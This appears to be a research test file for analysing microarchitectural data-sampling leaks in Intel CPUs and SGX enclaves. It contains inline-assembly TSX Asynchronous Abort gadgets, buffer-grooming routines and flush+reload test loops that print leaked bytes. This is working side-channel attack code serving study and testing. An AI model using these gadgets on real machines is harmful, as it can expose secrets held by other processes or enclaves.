#define SHL_RELOAD_SHIFT_RAX "shl $" STR(RELOAD_SHIFT) ", %%rax\n"

#define TAA_INTER_SPECULATION               \
    "xbegin 1f\n"                           \
    "movq $0, %%rax\n" SHL_RELOAD_SHIFT_RAX \
    "movzbq (%%rax, %1), %%rax\n" REP_ABORT \
    "xend\n"                                \
    "1:\n"

#define TAA_SPECULATION                              \
    "xbegin 1f\n" MOVZBQ_ADDR_0 SHL_RELOAD_SHIFT_RAX \
    "movzbq (%%rax, %1), %%rax\n" REP_ABORT          \
    "xend\n"                                         \
    "1:\n"

/**
 * TSX Asynchronous Abort Attack Code. The number at the 
 * end of the function is the first 8 digits of SHA1 hash of its content 
 * (including the last newline character).
 * 
 * @param leak_source the leak_source to be accessed in the taa attack.
 * @param reload_buffer the reload_buffer used to retreive encoded value.
 * @param leak_source_shadow Another virtual address for the same leak_source.
 * 
 */
void taa_1ae694f7(uint8_t *leak_source, uint8_t *reload_buffer,
                  uint8_t *leak_source_shadow)
{
    // EMPTY
}

/**
 * TSX Asynchronous Abort Attack Code. The number at the 
 * end of the function is the first 8 digits of SHA1 hash of its content 
 * (including the last newline character).
 * 
 * @param leak_source the leak_source to be accessed in the taa attack.
 * @param reload_buffer the reload_buffer used to retreive encoded value.
 * @param leak_source_shadow Another virtual address for the same leak_source.
 * 
 */
void taa_e1a21680(uint8_t *leak_source, uint8_t *reload_buffer,
                  uint8_t *leak_source_shadow)
{
    asm volatile(
        TAA_PREPERATION TAA_INTER_SPECULATION
        :
        : "r"(leak_source), "r"(reload_buffer), "r"(leak_source_shadow)
        : "rax");
}

/**
 * TSX Asynchronous Abort Attack Code. The number at the 
 * end of the function is the first 8 digits of SHA1 hash of its content 
 * (including the last newline character).
 * 
 * @param leak_source the leak_source to be accessed in the taa attack.
 * @param reload_buffer the reload_buffer used to retreive encoded value.
 * @param leak_source_shadow Another virtual address for the same leak_source.
 * 
 */
void taa_7d05af71(uint8_t *leak_source, uint8_t *reload_buffer,
                  uint8_t *leak_source_shadow)
{
    asm volatile(
        TAA_PREPERATION TAA_SPECULATION
        :
        : "r"(leak_source), "r"(reload_buffer), "r"(leak_source_shadow)
        : "rax");
}

/** ===== libsgxanalyser/core_utility/sgxmds_trts.c ===== */

void first_buffer_grooming(uint8_t *grooming_buffer_1)
{
    // #if FIRST_BUFFER_GROOMING_INST == ENUM_EMPTY
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_GP_LOAD
    //     fill_lfb_gp_load_1(grooming_buffer_1);
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_GP_STORE
    //     fill_lfb_gp_store_1(grooming_buffer_1);
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_NT_LOAD
    //     fill_lfb_nt_load_1(grooming_buffer_1);
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_NT_STORE
    //     fill_lfb_nt_store_1(grooming_buffer_1);
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_STR_LOAD
    //     fill_lfb_str_load_1(grooming_buffer_1);
    // #elif FIRST_BUFFER_GROOMING_INST == ENUM_STR_STORE
    fill_lfb_str_store_1(grooming_buffer_1);
    // #endif
}

void second_buffer_grooming(uint8_t *grooming_buffer_2)
{
#if SECOND_BUFFER_GROOMING_INST == ENUM_EMPTY
#elif SECOND_BUFFER_GROOMING_INST == ENUM_GP_LOAD
    fill_lfb_gp_load_2(grooming_buffer_2);
#elif SECOND_BUFFER_GROOMING_INST == ENUM_GP_STORE
    fill_lfb_gp_store_2(grooming_buffer_2);
#elif SECOND_BUFFER_GROOMING_INST == ENUM_NT_LOAD
    fill_lfb_nt_load_2(grooming_buffer_2);
#elif SECOND_BUFFER_GROOMING_INST == ENUM_NT_STORE
    fill_lfb_nt_store_2(grooming_buffer_2);
#elif SECOND_BUFFER_GROOMING_INST == ENUM_STR_LOAD
    fill_lfb_str_load_2(grooming_buffer_2);
#elif SECOND_BUFFER_GROOMING_INST == ENUM_STR_STORE
    fill_lfb_str_store_2(grooming_buffer_2);
#endif
}

void buffer_clearing(uint8_t *clear_buffer)
{
#if BUFFER_CLEARING == ENUM_NO_CLEAR
#elif BUFFER_CLEARING == ENUM_VERW_CLEAR
    clear_lfb_verw(clear_buffer);
#elif BUFFER_CLEARING == ENUM_ORPD_CLEAR
    clear_lfb_orpd(clear_buffer);
#endif
}

void base_attack(uint8_t *leak_source, uint8_t *reload_buffer,
                 uint8_t *leak_source_shadow)
{
#if MDS_ATTACK == ENUM_TAA
    BASE_TAA(leak_source, reload_buffer, leak_source_shadow);
#elif MDS_ATTACK == ENUM_MFBDS
    BASE_MFBDS(leak_source, reload_buffer, leak_source_shadow);
#endif
}

void inter_attack(uint8_t *leak_source, uint8_t *reload_buffer,
                  uint8_t *leak_source_shadow)
{
#if MDS_ATTACK == ENUM_TAA
    INTER_TAA(leak_source, reload_buffer, leak_source_shadow);
#elif MDS_ATTACK == ENUM_MFBDS
    INTER_MFBDS(leak_source, reload_buffer, leak_source_shadow);
#endif
}

void ult_attack(uint8_t *leak_source, uint8_t *reload_buffer,
                uint8_t *leak_source_shadow)
{
#if MDS_ATTACK == ENUM_TAA
    ULT_TAA(leak_source, reload_buffer, leak_source_shadow);
#elif MDS_ATTACK == ENUM_MFBDS
    ULT_MFBDS(leak_source, reload_buffer, leak_source_shadow);
#endif
}

/** ===== libsgxanalyser/core_utility/sgxmds_utility.c ===== */

void config_environment()
{
    malloc_mds_attack_buffer(&leak_source);
    remap_mds_attack_buffer(&leak_source_shadow, leak_source);
    assign_mds_attack_buffer(leak_source_shadow);
    mark_mds_attack_buffer(leak_source);

    malloc_grooming_buffer(&grooming_buffer_1);
    malloc_grooming_buffer(&grooming_buffer_2);
    mark_grooming_buffer_1(grooming_buffer_1);
    mark_grooming_buffer_2(grooming_buffer_2);
    assign_grooming_buffer_1(grooming_buffer_1);
    assign_grooming_buffer_2(grooming_buffer_2);

    malloc_flush_reload_buffers(&reload_buffer, &reload_results);

#if DOMAIN_SELECT == USE_SGX_EEXIT
    create_enclave(&global_eid);
#elif DOMAIN_SELECT == USE_SGX_AEX
    create_enclave(&global_eid);
    malloc_fault_buffer(&fault_buffer);
    ASSERT(signal(SIGSEGV, sigsegv_handler) != SIG_ERR);
#elif DOMAIN_SELECT == USE_SGX_COMBINED
    create_enclave(&global_eid);
#endif
}

void unconfig_environment()
{
    free_mds_attack_buffer(leak_source);
    free_grooming_buffer(grooming_buffer_1);
    free_grooming_buffer(grooming_buffer_2);
    free_flush_reload_buffers(reload_buffer, reload_results);

#if DOMAIN_SELECT == USE_SGX_EEXIT
    destroy_enclave(global_eid);
#elif DOMAIN_SELECT == USE_SGX_AEX
    destroy_enclave(global_eid);
    free_fault_buffer(fault_buffer);
#elif DOMAIN_SELECT == USE_SGX_COMBINED
    destroy_enclave(global_eid);
#endif
}

#if DOMAIN_SELECT == USE_SGX_AEX
int sigsegv_signal;
#endif

/** ========== */

void step_buffer_grooming(uint8_t *grooming_buffer_1,
                          uint8_t *grooming_buffer_2,
                          uint8_t *clear_buffer)
{
    // #if DOMAIN_SELECT == USE_GENERAL
    first_buffer_grooming(grooming_buffer_1);
    //     second_buffer_grooming(grooming_buffer_2);
    //     buffer_clearing(clear_buffer);
    // #elif DOMAIN_SELECT == USE_SGX_EEXIT
    //     ecall_buffer_grooming_eexit(global_eid, grooming_buffer_1,
    //                           grooming_buffer_2, clear_buffer);
    // #elif DOMAIN_SELECT == USE_SGX_AEX
    //     mark_fault_buffer(fault_buffer);
    //     ecall_buffer_grooming_aex(global_eid, grooming_buffer_1, grooming_buffer_2,
    //                                 clear_buffer, fault_buffer);
    // #endif
}

void step_mds_attack(uint8_t *leak_source, uint8_t *reload_buffer,
                     uint8_t *leak_source_shadow)
{
    // #if DOMAIN_SELECT == USE_GENERAL
    ult_attack(leak_source, reload_buffer, leak_source_shadow);
    // #elif DOMAIN_SELECT == USE_SGX_EEXIT
    //     ult_attack(leak_source, reload_buffer, leak_source_shadow);
    // #elif DOMAIN_SELECT == USE_SGX_AEX
    //     if (sigsegv_signal)
    //     {
    //         ult_attack(leak_source, reload_buffer, leak_source_shadow);
    //     }
    // #endif
}

// #if DOMAIN_SELECT == USE_SGX_AEX
// void sigsegv_handler(int signal)
// {
//     sigsegv_signal = signal;
//     unmark_fault_buffer(fault_buffer);
// #if PMC_USAGE == NO_PMC
//     step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
// #elif PMC_USAGE == USE_PMC
//     wrapped_mds_attack(leak_source, reload_buffer, leak_source_shadow);
// #endif
//     sigsegv_signal = 0;
// }
// #endif

void combined_steps(uint8_t *grooming_buffer_1, uint8_t *grooming_buffer_2,
                    uint8_t *clear_buffer, uint8_t *leak_source,
                    uint8_t *reload_buffer, uint8_t *leak_source_shadow)
{
    // #if DOMAIN_SELECT == USE_SGX_COMBINED
    //     ecall_combined_grooming_attack(global_eid, grooming_buffer_1, grooming_buffer_2, clear_buffer,
    //                                  leak_source, reload_buffer, leak_source_shadow);
    // #else
    step_buffer_grooming(grooming_buffer_1, grooming_buffer_2, clear_buffer);
    step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
    // #endif
}

#pragma endregion

#pragma region /** test_app */ 

void test_app_init()
{
    open_system_file();
    config_environment();
}

void test_app_fini()
{
    close_system_file();
    unconfig_environment();
}

Test(test_sgx_analyser, test_app, .init = test_app_init, .fini = test_app_fini, .disabled = true)
{
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow); // IMPORTANT: NOT TO FLUSH
        flush_reload_buffer(reload_buffer);
        combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
                       leak_source, reload_buffer, leak_source_shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);
}

#pragma endregion

#pragma region /** test_dual_data */

#include "enclyser/libenclyser/attack.h"
#include "enclyser/libenclyser/flush_reload.h"

enclyser_buffer_t filling_buffer;

enclyser_attack_t attack_spec;
enclyser_buffer_t attaking_buffer;
enclyser_buffer_t encoding_buffer;
enclyser_buffer_t printing_buffer;

void test_dual_data_init()
{
    open_system_file();
    config_environment();

    attack_spec = (enclyser_attack_t){
        .major = ATTACK_MAJOR_TAA,
        .minor = ATTACK_MINOR_STABLE};

    filling_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_FILLING_BUFFER_SIZE,
        .value = DEFAULT_BUFFER_VALUE,
        .order = DEFAULT_BUFFER_ORDER,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    attaking_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_ATTACKING_BUFFER_SIZE,
        .value = 0xff, // IMPORTANT: MUST BE NON-ZERO VALUE
        .order = BUFFER_ORDER_CONSTANT,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    encoding_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_ENCODING_BUFFER_SIZE,
        .value = DEFAULT_BUFFER_VALUE,
        .order = DEFAULT_BUFFER_ORDER,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    printing_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_PRINTING_BUFFER_SIZE,
        .value = DEFAULT_BUFFER_VALUE,
        .order = DEFAULT_BUFFER_ORDER,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    malloc_enclyser_buffer(&filling_buffer);

    malloc_enclyser_buffer(&attaking_buffer);
    malloc_enclyser_buffer(&encoding_buffer);
    malloc_enclyser_buffer(&printing_buffer);

    assign_enclyser_buffer(&attaking_buffer); // IMPORTANT, BUT DONT KNOW WHY
}

void test_dual_data_fini()
{
    free_enclyser_buffer(&filling_buffer);

    free_enclyser_buffer(&attaking_buffer);
    free_enclyser_buffer(&encoding_buffer);
    free_enclyser_buffer(&printing_buffer);

    unconfig_environment();
    close_system_file();
}

Test(test_sgx_analyser, test_dual_data, .init = test_dual_data_init, .fini = test_dual_data_fini, .disabled = true)
{
    /** ZERO SUBSTITUTE */
    INFO("ZERO SUBSTITUTE");
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow);
        flush_reload_buffer(reload_buffer);
        combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
                       leak_source, reload_buffer, leak_source_shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);

    /** FILL SUBSTITUTE */
    INFO("FILL SUBSTITUTE");
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow);
        flush_reload_buffer(reload_buffer);
        // combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
        //              leak_source, reload_buffer, leak_source_shadow);
        combined_steps(filling_buffer.buffer, NULL, NULL,
                       leak_source, reload_buffer, leak_source_shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);

    /** ATTACK SUBSTITUTE */
    INFO("ATTACK SUBSTITUTE");
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow);
        flush_reload_buffer(reload_buffer);
        // combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
        //              leak_source, reload_buffer, leak_source_shadow);
        combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
                       attaking_buffer.buffer, reload_buffer, attaking_buffer.shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);

    /** RELOAD SUBSTITUTE */
    INFO("RELOAD SUBSTITUTE");
    // reset_reload_results(reload_results);
    reset_reload_results(printing_buffer.buffer);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow);
        // flush_reload_buffer(reload_buffer);
        flush_reload_buffer(encoding_buffer.buffer);
        // combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
        //              leak_source, reload_buffer, leak_source_shadow);
        combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
                       leak_source, encoding_buffer.buffer, leak_source_shadow);
        // reload_reload_buffer(reload_buffer, reload_results);
        reload_reload_buffer(encoding_buffer.buffer, printing_buffer.buffer);
    }
    // print_reload_results(reload_results);
    print_reload_results(printing_buffer.buffer);

    /** FULL SUBSTITUTE */
    INFO("FULL SUBSTITUTE");
    // reset_reload_results(reload_results);
    reset_reload_results(printing_buffer.buffer);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_mds_attack_buffer(leak_source_shadow);
        // flush_reload_buffer(reload_buffer);
        flush_reload_buffer(encoding_buffer.buffer);
        // combined_steps(grooming_buffer_1, grooming_buffer_2, clear_buffer,
        //              leak_source, reload_buffer, leak_source_shadow);
        combined_steps(filling_buffer.buffer, NULL, NULL,
                       attaking_buffer.buffer, encoding_buffer.buffer, attaking_buffer.shadow);
        // reload_reload_buffer(reload_buffer, reload_results);
        reload_reload_buffer(encoding_buffer.buffer, printing_buffer.buffer);
    }
    // print_reload_results(reload_results);
    print_reload_results(printing_buffer.buffer);
}

#pragma endregion

#pragma region /** test_dual_func */

#include "enclyser/libenclyser/attack.h"
#include "enclyser/libenclyser/flush_reload.h"
#include "enclyser/libenclyser/lfb.h"

enclyser_buffer_t filling_buffer;

enclyser_attack_t attack_spec;
enclyser_buffer_t attaking_buffer;
enclyser_buffer_t encoding_buffer;
enclyser_buffer_t printing_buffer;

void test_dual_func_init()
{
    open_system_file();
    config_environment();

    attack_spec = (enclyser_attack_t){
        .major = ATTACK_MAJOR_TAA,
        .minor = ATTACK_MINOR_STABLE};

    filling_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_FILLING_BUFFER_SIZE,
        .value = 0x1,
        .order = BUFFER_ORDER_OFFSET_INLINE,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    attaking_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_ATTACKING_BUFFER_SIZE,
        .value = 0xff, // IMPORTANT: MUST BE NON-ZERO VALUE
        .order = BUFFER_ORDER_CONSTANT,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    encoding_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_ENCODING_BUFFER_SIZE,
        .value = DEFAULT_BUFFER_VALUE,
        .order = DEFAULT_BUFFER_ORDER,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    printing_buffer = (enclyser_buffer_t){
        .buffer = NULL,
        .shadow = NULL,
        .size = DEFAULT_PRINTING_BUFFER_SIZE,
        .value = DEFAULT_BUFFER_VALUE,
        .order = DEFAULT_BUFFER_ORDER,
        .mem_type = DEFAULT_BUFFER_MEM_TYPE,
        .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

    malloc_enclyser_buffer(&filling_buffer);

    malloc_enclyser_buffer(&attaking_buffer);
    malloc_enclyser_buffer(&encoding_buffer);
    malloc_enclyser_buffer(&printing_buffer);

    assign_enclyser_buffer(&filling_buffer);

    assign_enclyser_buffer(&attaking_buffer); // IMPORTANT, BUT DONT KNOW WHY
}

void test_dual_func_fini()
{
    free_enclyser_buffer(&filling_buffer);

    free_enclyser_buffer(&attaking_buffer);
    free_enclyser_buffer(&encoding_buffer);
    free_enclyser_buffer(&printing_buffer);

    unconfig_environment();
    close_system_file();
}

Test(test_sgx_analyser, test_dual_func, .init = test_dual_func_init, .fini = test_dual_func_fini)
{
    /** ZERO SUBSTITUTE */
    INFO("ZERO SUBSTITUTE");
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        flush_reload_buffer(reload_buffer);
        step_buffer_grooming(grooming_buffer_1, grooming_buffer_2, clear_buffer);
        step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);

    /** FILL SUBSTITUTE */
    INFO("FILL SUBSTITUTE");
    reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        flush_reload_buffer(reload_buffer);
        // step_buffer_grooming(grooming_buffer_1, grooming_buffer_2, clear_buffer);
        fill_lfb(FILLING_SEQUENCE_STR_STORE, &filling_buffer);
        step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
        reload_reload_buffer(reload_buffer, reload_results);
    }
    print_reload_results(reload_results);

    /** ATTACK & RELOAD SUBSTITUTE */
    INFO("ATTACK & RELOAD SUBSTITUTE");
    // reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_reload_buffer(reload_buffer);
        flush_enclyser_buffer(&encoding_buffer);
        step_buffer_grooming(grooming_buffer_1, grooming_buffer_2, clear_buffer);
        // step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
        attack(&attack_spec, &attaking_buffer, &encoding_buffer);
        // reload_reload_buffer(reload_buffer, reload_results);
        reload(&encoding_buffer, &printing_buffer);
    }
    // print_reload_results(reload_results);
    print(&printing_buffer);

    /** FULL SUBSTITUTE */
    INFO("FULL SUBSTITUTE");
    // reset_reload_results(reload_results);
    for (rep = 0; rep < REPETITION_LIMIT; rep++)
    {
        // flush_reload_buffer(reload_buffer);
        flush_enclyser_buffer(&encoding_buffer);
        // step_buffer_grooming(grooming_buffer_1, grooming_buffer_2, clear_buffer);
        fill_lfb(FILLING_SEQUENCE_STR_STORE, &filling_buffer);
        // step_mds_attack(leak_source, reload_buffer, leak_source_shadow);
        attack(&attack_spec, &attaking_buffer, &encoding_buffer);
        // reload_reload_buffer(reload_buffer, reload_results);
        reload(&encoding_buffer, &printing_buffer);
    }
    // print_reload_results(reload_results);
    print(&printing_buffer);
}

#pragma endregion